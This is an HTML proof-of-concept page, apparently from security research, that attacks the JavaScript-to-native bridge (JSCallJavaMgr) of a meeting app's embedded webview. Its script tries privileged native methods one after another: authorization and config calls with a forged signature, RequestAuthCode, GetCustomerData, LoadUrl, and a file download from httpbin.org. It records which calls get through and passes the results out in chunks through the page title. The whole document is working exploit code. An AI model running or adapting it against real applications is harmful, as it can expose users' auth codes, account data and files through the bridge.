<!doctype html>
<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
<body><h1>WM-POC-P12</h1>
<script>
document.title='P12-START '+location.host+' '+location.pathname;
function note(t){ document.title=String(t); }
function call(mod, method, param){
  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
    callId:mod+'.'+method
  }));
}
var rows=[];
function norm(res){
  if(typeof res==='string'){
    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,80)}; }
  }
  return res||{};
}
window.__wmpoc=function(res){
  res=norm(res);
  var msg=String(res.message||'');
  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
  rows.push((deny?'D':'A')+':'+(res.callId||'?')+':'+res.code+':'+msg.replace(/\|/g,'/').slice(0,50));
};
function dump(){
  if(!rows.length){ note('CB P12-EMPTY'); return; }
  var blob=rows.join('|');
  var n=0, p=0;
  function chunk(){
    if(p>=blob.length){ note('CB P12-DONE n='+rows.length); return; }
    note('CB '+n+' '+blob.slice(p,p+90));
    p+=90; n++;
    setTimeout(chunk, 1100);
  }
  chunk();
}
var jsList=['LoadUrl','DownloadFile','ExportFile','GetFileBase64','OpenNewPage','CreateWebview','GetClipboardData'];
var steps=[
  function(){ note('JSB='+!!window.JSCallJavaMgr+' host='+location.host); },
  function(){ call('OpenApiPlugin','CheckJsApiConfig',{jsApiList:jsList}); },
  function(){ call('OpenApiPlugin','JsApiConfig',{jsApiList:jsList}); },
  function(){ call('OpenApiPlugin','JsApiConfig',{appId:'wemeet',timestamp:String(Date.now()),nonceStr:'p12',signature:'x',jsApiList:jsList}); },
  function(){ call('OpenApiPlugin','JsApiAgentConfig',{jsApiList:jsList}); },
  function(){ call('OpenApiPlugin','Authorize',{}); },
  function(){ call('OpenApiPlugin','RequestAuthCode',{}); },
  function(){ call('OpenApiPlugin','GetCustomerData',{}); },
  function(){ call('OpenApiPlugin','GetOpenAppInfo',{}); },
  function(){ call('OpenApiPlugin','SetOpenJsApiConfig',{jsApiList:jsList}); },
  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
  function(){ call('MeetlogWebPlugin','DownloadFile',{url:'https://httpbin.org/bytes/32',fileName:'p.bin',md5:''}); },
  function(){ call('CommonPlugin','GetPerformance',{}); }
];
var i=0;
function next(){
  if(i>=steps.length){ setTimeout(dump, 1800); return; }
  try{ steps[i](); }catch(e){ rows.push('EX:'+e); }
  i++;
  setTimeout(next, 700);
}
setTimeout(next, 400);
</script>
</body></html>
